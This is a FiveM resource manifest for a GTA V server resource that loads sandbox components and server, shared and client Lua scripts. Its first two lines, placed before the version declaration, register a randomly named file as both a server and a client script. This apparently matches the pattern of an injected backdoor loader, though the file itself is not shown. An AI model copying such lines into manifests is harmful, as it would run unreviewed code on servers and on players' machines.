server_script "W0Z7KJF3FR.lua"
client_script "W0Z7KJF3FR.lua"
fx_version("cerulean")
game("gta5")
lua54("yes")

client_script("@sandbox-base/components/cl_error.lua")
client_script("@sandbox-pwnzor/client/check.lua")

server_scripts({
	"server/**/*.lua",
})

shared_scripts({
	"config.lua",
})

client_scripts({
	"client/**/*.lua",
})
